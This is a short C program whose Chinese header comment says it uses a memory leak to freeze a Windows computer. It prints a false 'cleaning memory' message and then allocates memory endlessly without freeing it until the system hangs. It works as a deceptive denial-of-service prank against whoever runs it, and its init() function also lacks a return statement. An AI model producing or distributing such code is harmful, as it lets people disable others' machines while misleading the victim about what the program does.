/*
利用内存泄漏让windows电脑卡死
*/
#include <stdio.h>
#include <stdlib.h>

struct data_struct
{
    int value;
    int array[1000];
};

struct data_struct* init(){
    struct data_struct* mydata = malloc(sizeof(struct data_struct));
    if (!mydata)
    {
        perror("Error: no memory to calloc");
        exit(EXIT_FAILURE);
    }
    
}


int main(){
    printf("正在清理内存中......");
    while (1)
    {
        init();
    }
    
    

    return 0;
}